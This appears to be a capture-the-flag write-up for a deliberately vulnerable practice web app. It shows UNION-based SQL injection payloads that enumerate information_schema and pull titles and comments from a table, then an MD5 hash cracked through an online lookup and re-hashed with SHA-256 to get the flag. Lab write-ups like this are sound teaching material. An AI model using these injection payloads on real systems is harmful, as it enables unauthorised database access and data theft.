Steps:
1. Typing 1 gives us the result:

ID: 1 
Title: Nsa
Url : https://fr.wikipedia.org/wiki/Programme_

So, we can see that the approximate SQL-query is
SELECT firts_name, last_name FROM users WHERE user_id = 1;

Now we know that we've got some table in a database that contains at least 3 pieces of information related to a member: an ID (the value we type), a title, and a Url.

2. The next step is to find the name of the table (or tables) in presented database using the UNION injection, as it was in the previous exercise.

1 UNION
SELECT column_name, table_name
FROM information_schema.columns;

Among the default tables we can find our whith columns that corresponds our output:

    - list_images (it contains 'url' and 'title')

    ID: 1 UNION SELECT column_name, table_name FROM information_schema.columns; 
    Title: list_images
    Url : id

    ID: 1 UNION SELECT column_name, table_name FROM information_schema.columns; 
    Title: list_images
    Url : url

    ID: 1 UNION SELECT column_name, table_name FROM information_schema.columns; 
    Title: list_images
    Url : title

    ID: 1 UNION SELECT column_name, table_name FROM information_schema.columns; 
    Title: list_images
    Url : comment

4. Then we select the columns that contains titles and commentaries, and finally get our flag:

1 UNION SELECT title, comment FROM list_images;

Result:

ID: 1 UNION SELECT title, comment FROM list_images; 
Title: Nsa
Url : https://fr.wikipedia.org/wiki/Programme_

ID: 1 UNION SELECT title, comment FROM list_images; 
Title: An image about the NSA !
Url : Nsa

ID: 1 UNION SELECT title, comment FROM list_images; 
Title: There is a number..
Url : 42 !

ID: 1 UNION SELECT title, comment FROM list_images; 
Title: Google it !
Url : Google

ID: 1 UNION SELECT title, comment FROM list_images; 
Title: Earth!
Url : Earth

ID: 1 UNION SELECT title, comment FROM list_images; 
Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Url : Hack me ?

5. So to decrypt the provided password we use a public online source:

https://md5decrypt.net/

For the hash we obtained:

1928e8083cf461a51303633093573c46 : albatroz

It is already lowercased, so the final step is to encrypt it with SHA‑256, using the command:

echo -n albatroz | sha256sum

And here we are: 
f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
